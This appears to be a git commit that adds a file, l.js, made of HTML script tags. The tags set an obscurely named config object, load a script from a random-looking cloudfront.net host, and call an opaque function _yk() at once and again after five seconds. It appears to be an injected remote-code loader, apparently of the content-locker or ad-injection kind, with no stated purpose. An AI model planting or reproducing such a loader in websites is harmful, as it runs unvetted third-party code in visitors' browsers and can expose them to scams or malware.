984990d6649818129be1f7ba714c5a8c91bc8707
dev20l <iphonetasli@gmail.com>
2024-09-15 09:30:20 -0700

    Create l.js

---
+++ l.js
@@ -0,0 +1,6 @@
+<script type="text/javascript">
+    var aoQLJ_suk_WVcHgc={"it":4202275,"key":"ca438"};
+</script>
+<script src="https://dxnp0xi26y9q.cloudfront.net/61e0cbd.js"></script>
+<script>_yk();</script>
+<script>setTimeout(_yk, 5000);</script>
